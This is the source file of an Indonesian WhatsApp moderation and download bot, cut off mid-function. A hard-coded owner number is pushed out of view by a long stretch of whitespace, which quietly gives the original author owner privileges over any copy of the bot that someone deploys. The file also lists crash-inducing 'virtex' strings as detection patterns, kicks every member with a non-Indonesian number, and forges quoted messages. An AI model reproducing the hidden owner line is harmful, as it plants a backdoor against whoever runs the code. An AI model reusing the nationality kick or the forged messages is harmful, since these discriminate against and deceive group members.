/* 
 /************************* 
 * Pake tinggal make 
 * jangan hapus sumbernya 
 ************************** 
 * Github: FuadXyro
 * Wa: 083837709331 
 */
"use strict";
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process")
const axios = require("axios");
const yts = require("yt-search");
const gtts = require( 'node-gtts')
const canvacard = require("canvacard");
const speed = require("performance-now");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const { removeBackgroundFromImageFile } = require('remove.bg')
const os = require('os');
const { performance } = require('perf_hooks')
const fetch = require('node-fetch');
const cheerio = require( 'cheerio')
const request = require("request")
const anonfile = require('anonfile-lib')
const { youtubeSearch, pinterest, mediafiredl,  lyricsv2,  lyrics, facebookdl, facebookdlv2, tiktokdl, tiktokdlv2, twitterdl, twitterdlv2, getZodiac, liputan6, googleIt, wallpaperv2, chord, googleImage,  jadwalTVNow,  gempa,  stickerTelegram, stickerLine, latinToAksara, aksaraToLatin, asmaulhusnajson, alquran, listJadwalSholat, gempaNow, instagramdl, instagramdlv3, instagramdlv2, instagramStory, savefrom, snapsave } = require('@bochilteam/scraper')

//----------------- LIB FILE ------------------\\
const { userXp, userLeveling, } = require("../lib/user");
const TicTacToe = require("../lib/tictactoe")
const { msgFilter, addSpam, SpamExpired, cekSpam} = require('../lib/antispam')
const { color } = require('../lib/color')
const { doodstream, terabox } = require('../lib/18+')
const photooxy = require('../lib/photooxy');
const {toFirstCase,isNumber,formatp,parseMention, resize, getRandom,generateProfilePicture, getCase,runtime,FileSize,h2k, makeid,kyun,randomNomor,jsonformat, isUrl, fetchJson, sleep,getBuffer,} = require("../lib/myfunc");
const {floNime, UploadFileUgu, TelegraPh, uploadFile} = require('../lib/uploader')
const {  toAudio,  toPTT,  toVideo,  ffmpeg} = require('../lib/convert')
const { capcutdl, mediafiredll, instagram2, instagram3, cekkuota, tele, ytPlayMp4, ytPlayMp3, textpro,igdl, kodepos, mediafire, ffstalk, mlstalk, Tiktok, surah, tafsirsurah, ephoto, emoji} = require('../lib/scraper') 
const { addblockcmd, deleteblockcmd, checkblockcmd } = require ("../lib/blockcmd");
const { addError,clearAllError, deleteError, checkError } = require("../lib/totalerror")
const { Nothing,Failed,Succes,addAutoClear,autoClearChat, checkDataName, createDataId, addDataId, removeDataId, checkDataId, getHit, cmdAdd, expiredCmd } = require("../lib/totalcmd");
const _sewa = require('../lib/sewa')
const _prem = require("../lib/premium");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("../lib/banned")
const { jadibot, stopjadibot, listjadibot } = require('../lib/jadibot.js')



//----------------- MESSAGE FILE ------------------\\
let { dada } = require("../message/sewabot.js")


//database
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
const sewa = db.data.sewa
const spammer = []
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
let secreto = JSON.parse(fs.readFileSync('./database/secreto_balas.json'))


  
var publik = true


//=================================================//
module.exports = async(conn, dev, chatUpdate, store) => {
//console.log(chatUpdate.messages)

const m = dev
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             var Ownerin ="6283837709331@s.whatsapp.net"
var ownerNumber = [`${nomerOwner}@s.whatsapp.net`,`6283837709331@s.whatsapp.net`,`${conn.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp.low
if (seli > Intervalmsg) return console.log(new ReferenceError(`Pesan ${Intervalmsg} detik yang lalu diabaikan agar tidak nyepam`))
//if(m.chat !== Ownerin) return
try {

const { type, now, args, sender, fromMe,from,botNumber,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body,} = dev

  ///_&-
if (multi){
var prefix = /^#.!¦|\\^/.test(body) ? body.match(/^#.!¦|\\^/gi) : '.'
var thePrefix = "Multi Prefix"
}                        

const isCmd = body.startsWith(prefix)
const isCommand = isCmd? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() :""
const q = args.join(' ')
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const isOwner = ownerNumber.includes(sender) || checkDataId ("owner", sender, DataId) 
const command = isOwner? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const theOwner = sender == Ownerin 
const timestampp = speed();
const latensi = speed() - timestampp
const quoted = dev.quoted ? dev.quoted : dev
const mime = (quoted.msg || quoted).mimetype || ''
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''

require("./message.js")(senderNumber, prefix,command)

const user = global.db.data.users[m.sender]
const chat = isGroup? global.db.data.chats[m.chat] : false
const isSimi = isGroup ? siminya.includes(m.chat) : false 
const kickon = global.db.data.kickon[m.chat]


if(isCmd){
await conn.readMessages([m.key])
}


//Waktu
let d = new Date
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
const calender = d.toLocaleDateString("id", {
day: 'numeric',
month: 'long',
year: 'numeric'
})


  function clockString(ms) {
let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " hari, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " jam, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " menit, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " detik") : "";
let time = d > 0 ? dDisplay + hDisplay + mDisplay + sDisplay : hDisplay + mDisplay + sDisplay
return time
}


  
//if(selectedButton == "register"){
if(isCmd){
if (user) {
if (!('name' in user)) user.name = pushname
if (!('id' in user)) user.id = senderNumber
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.level)) user.level = 1
if (!isNumber(user.hit)) user.hit = 1
if (!isNumber(user.balance)) user.balance = 1000
if (!isNumber(user.limit)) user.limit = 30
if (!isNumber(user.glimit)) user.glimit = 30
if (!('serial' in user)) user.serial = makeid(4)
if (!isNumber(user.afk)) user.afk = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.pc)) user.pc = 0
if (!('autolevelup' in user)) user.autolevelup = false
if (!isNumber(user.pc)) user.pc = 0
if (!user.grade) user.grade = 'Newbie'

} else {
global.db.data.users[m.sender] = {
name: pushname,
id: senderNumber,
date: calender,
exp: 100,
level: 1,
hit: 0,
balance: 1000,
limit: 30,
glimit: 30,
serial: makeid(4).toUpperCase(),
lastclaim: 0,
afk: -1,
pc: 0,
grade: 'Newbie',
autolevelup: false,
}


let ppimg = await conn.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
const img = "https://cdn.discordapp.com/embed/avatars/0.png";
const background = "https://img.freepik.com/free-vector/abstact-hexagon-background-memphis-style_1017-31955.jpg?w=740&t=st=1665800355~exp=1665800955~hmac=7b367757d82bb686793cb64b15e33e04e6908578441a491733740c4b24c5705a";

const welcomer = new canvacard.Welcomer()
  .setAvatar(ppimg)
  .setBackground('IMAGE', background)
  .setTitulo(`REGISTERED SUCCES`)
  .setSubtitulo(calender)
  .setColorTitulo("#FFFFFF")
  .setColorSubtitulo("#FFFFFF")
  .setColorCircle("#7CFC00")
  .setColorBorder("#154c79")
  .setOpacityBorder("0")
  .registerFonts()
let foto = await getRandom(".png")
welcomer.build({fontX: "Roboto Black", fontY: "Roboto Black"})
.then(async data => {
await canvacard.write(data,foto);
let anu = await TelegraPh(foto)

  
 let teks =`*]───── REGISTERED ─────[*
 
👤 Nama: ${pushname}
☎️ Nomer: ${senderNumber}
📡 Serial: ${db.data.users[m.sender].serial}
📍 Verified: ${calender}
💸 Saldo: Rp 1000
⚜️ Grade: Newbie
🥇 Rank : 
🌀 Level : 1
 `
 
conn.sendMessage(from, {caption: teks, image: {url: anu}}, {quoted: dev})        
fs.unlinkSync(foto)
});


}

}


//if (typeof chat !== 'object') global.db.data.chats[m.chat] = {}
if (isGroup && chat) {
if (!('name' in chat)) chat.name = groupNmae
if (!isNumber(chat.add)) chat.add = 0
if (!('welcome' in chat)) chat.welcome = true
if (!('detect' in chat)) chat.detect = true
if (!('sWelcome' in chat)) chat.sWelcome = ''
if (!('sBye' in chat)) chat.sBye = ''
if (!('sPromote' in chat)) chat.sPromote = ''
if (!('sDemote' in chat)) chat.sDemote = ''
if (!('desc' in chat)) chat.desc = true
if (!('descUpdate' in chat)) chat.descUpdate = true
if (!('stiker' in chat)) chat.stiker = false
if (!('antiLink' in chat)) chat.antiLink = true
if (!isNumber(chat.expired)) chat.expired = 0
if (!('antiBadword' in chat)) chat.antiBadword = true
if (!('antispam' in chat)) chat.antispam = true
if (!('antitroli' in chat)) chat.antitroli = false
if (!('antivirtex' in chat)) chat.antivirtex = false
if (!('antiwame' in chat)) chat.antiwame = false
if (!('viewonce' in chat)) chat.viewonce = true
if (!('nsfw' in chat)) chat.nsfw = false
if (!('clear' in chat)) chat.clear = false
if (!isNumber(chat.cleartime)) chat.clearTime = 0
} else if (isGroup) global.db.data.chats[m.chat] = {
name: groupName,
add: 0,
welcome: true,
detect: true,
sWelcome: '',
sBye: '',
sPromote: '',
sDemote: '',
desc: true,
descUpdate: true,
autostiker: false,
antilink: false,
antilinkgc: false,
antidelete: false,
antiasing: false,
banchat: false,
expired: 0,
antibadword: true,
antispam: true,
antitroli: false,
antivirtex: false,
antiwame: false,
antihidetag: false,
viewonce: true,
nsfw: false,
clear: false,
clearTime: 0
}


  
//Security / Keamanan
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const isGroupOwner = isGroup ? groupMetadata.owner : ''
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAntiLink = isGroup ? db.data.chats[from].antilink : false
const isWelcome = isGroup ? db.data.chats[from].welcome : false
const isAntidelete = isGroup ? db.data.chats[from].antidelete : false
const isKickarea = isGroup ? db.data.chats[from].antiasing : false
const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : false
const isBanchat = isGroup ? db.data.chats[from].banchat : false 
const isAntiVirtex = isGroup ? db.data.chats[from].antivirtex : false
const isAntiWame = isGroup ? db.data.chats[from].antiwame : false
const isBanned = sender? cekBannedUser (senderNumber, ban) : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user
//const isHit = db.data.users[sender].hit > 1? true : false 
  
/*
// Presence Online
if (isCmd){
conn.sendPresenceUpdate('composing', from)
} else {
conn.sendPresenceUpdate('unvailable', from)
}
*/
/*
//Bot tidak bisa di akses di pc kecuali premium
if(!isGroup && !isPremium && isCmd) {
let teks = `Kamu bukan user premium
silahkan upgrade ke premium agar bisa menggunakan 
bot secara private chat
`
return conn.sendMessage(from,{text: teks})
}
*/



 //User 
const userLevel = user? db.data.users[m.sender].level : false
const userExp = user? db.data.users[m.sender].exp : false
const userId = user? db.data.users[m.sender].id : false
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 10000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = user? db.data.users[m.sender].date : false


 
  //Ucapan Waktu  
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'  }      
    
    


//FAKE REPLY  
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync('./stik/quoted.jpg')},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${pushname}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/quoted.jpg')}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 200, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/quoted.jpg'), sellerJid: `0@s.whatsapp.net`}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,'jpegThumbnail': fs.readFileSync('./stik/quoted.jpg')}}}
const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: { title: 'Halo bang', jpegThumbnail: fs.readFileSync('./stik/quoted.jpg')}}}
const fsimi = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": 'Simi Simi Bot', "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
  



 //SetReply
const setReply = async(teks) =>{ 
if(replyType === "web"){
 conn.sendMessage(from, { id: m.key.id, contextInfo: { externalAdReply:{ renderLargerThumbnail: true,previewType: null, thumbnail: null, sourceUrl: `https://wa.me/6283837709331?text=bang mau anu`}}, text: teks }, { quoted: dev })
} else if(replyType === "mess"){
conn.sendMessage(from, {text: teks}, { quoted: dev });
} else {
conn.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}


// Public & Self And Banchat
if (!publik && !itsMe && !isOwner && !theOwner) return 
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
}


const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: dev })
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  conn.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  conn.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: dev})
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendGif = (teks, teksnya) => {
conn.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: dev})
};        



  
conn.sendImageAsSticker = async (jid, media, dev, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    let jancok = new Sticker(media, {
        pack: packName, // The pack name
        author: authorName, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['🤩', '🎉'], // The sticker category
        id: '12345', // The sticker id
        quality: 50, // The quality of the output file
        background: '#FFFFFF00' // The sticker background color (only for full stickers)
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await conn.sendMessage(jid,{sticker: nah},{quoted: dev})
    return await fs.unlinkSync(stok)
     }


  
//onlyOwner
  const onlyOwner = async() =>{
setReply(mess.only.ownerB)
}

//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4') 
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: dev})
await fs.unlinkSync(`./${mp4File}`)
})     
} catch(err) {
setReply(`${err}`)
}
  }

//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link)	
let mp3File = getRandom('.mp3') 
ytdl(Link, {filter: 'audioonly'})
  
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
let search = await yts(Link)
let anu = search.videos[0];
conn.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mpeg', fileName: `${anu.title}.mp3`}, { quoted: dev })
await fs.unlinkSync(mp3File)
})       
} catch (err){
  setReply (`${err}`)
console.log(color(err))
}
} 

  

  
//-------------------- 》SECURITY《 ------------------\\
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(!isBotGroupAdmins) return reply ('Bot bukan admin jadi gbisa hapus pesan nya :(')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await conn.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
//if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
await setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf saya hapus karena antilink grub aktif`)
await sleep(2000)
if(isBotGroupAdmins) await conn.sendMessage(from, { delete: m.key })
 // conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}   


  
  //Auto kick jika itu user yang sudah di tandai
if(kickon){
if(isGroup && kickon.includes(sender)){
	
let teks = `${senderNumber} tidak di izinkan masuk
karena dia telah keluar dari group ini sebelumnya,
dan juga sudah di tandai sebagai user biadap`       
await conn.sendMessage(from, {text: teks,contextInfo: {mentionedJid: [sender]}},{quoted: dev})
if (!isBotGroupAdmins) return conn.sendMessage(from, {text: `Gagal  mengeluarkan @${sender} dari group karena bot bukan admin`,contextInfo: {mentionedJid: [sender]}},{quoted: dev}) 
if(isBotGroupAdmins) conn.groupParticipantsUpdate(from, [sender], 'remove')
} 
}

  
 
  
 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await conn.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
if(isBotGroupAdmins) conn.sendMessage(from, { delete: m.key })
conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

 //ANTI ASING/BULE OK
if (isGroup && isBotGroupAdmins &&isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.id)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.id == member[i]) 
if (!usersId.groupAdmins ){
await conn.groupParticipantsUpdate(from, [member[i]], 'remove')
await sleep(1000)
}
}
} 
}  

//ANTI VIRUS
if (isGroup && isAntiVirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
  conn.sendText(m.chat, `*TANDAI TELAH DIBACA*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Bang yg ngirim virtex nih:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await conn.groupParticipantsUpdate(from, [sender], 'remove')
conn.sendMessage(from, { delete: m.key })
await conn.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
 }
 }
 
 
 //ANTI WA.ME
if (isGroup && isAntiWame) {
if (budy.includes('https://wa.me') || budy.includes('wa.me') || budy.includes('Https://wa.me') || budy.includes('Wa.me') ) {
if (!isBotGroupAdmins) {return}
setReply (`*LINK WA ME TERDETEKSI*\n\nMaaf bot akan menghapus link tersebut!!,\n\nKetik .antiwame off untuk mematikan fitur anti wame`)
conn.sendMessage(from, { delete: m.key })
 }
 }

  
  
 //ANTI DELETE
if(type == 'protocolMessage' && isAntidelete){
let mess = chatUpdate.messages[0].message.protocolMessage
let chats = Object.entries(await conn.chats).find(([user, data]) => data.messages && data.messages[mess.key.id])
if(chats[1] !== undefined){
let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]))
await conn.copyNForward(mess.key.remoteJid, msg).catch(e => console.log(e, msg))
}
}
  

 // Mute Chat grub
if(isGroup){
let mut = db.data.chats[m.chat].mute
if (mut && !isGroupAdmins && !isOwner && !isGroupOwner) {
return
}      
}

//Jika ada yg cek bot akan merespon   
if (budy.startsWith('Bot') || budy.startsWith('bot')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
reply('Bot Aktif')
}

//Download video/audio yt
if(budy.startsWith('v') ||budy.startsWith('V') || budy.startsWith('Video') || budy.startsWith('video')) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "8s", AntiSpam)
if (!m.quoted) return
if (!m.quoted.isBaileys) return 
let urls = m.quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return 
reply(mess.wait)
for (let i of urls) {
downloadMp4(i)
}
}
    
if(budy.startsWith('a') || budy.startsWith('A') ||  budy.startsWith('Audio') || budy.startsWith('audio')) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "8s", AntiSpam)
if (!m.quoted) return 
if (!m.quoted.isBaileys) return 
let urls = m.quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return 
reply(mess.wait)
for (let i of urls) {
downloadMp3(i)
}
    }

  
//Auto Download Video Tiktok
if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/') ) {
try{
let data = await fetchJson (`https://xzn.wtf/api/tiktok?url=${budy}&apikey=${apiwtf}`)
if(data.data.duration === 0) {
 for(let i of data.data.images){
await sleep (2000)
conn.sendMedia(from, i, dev)
}
} else {
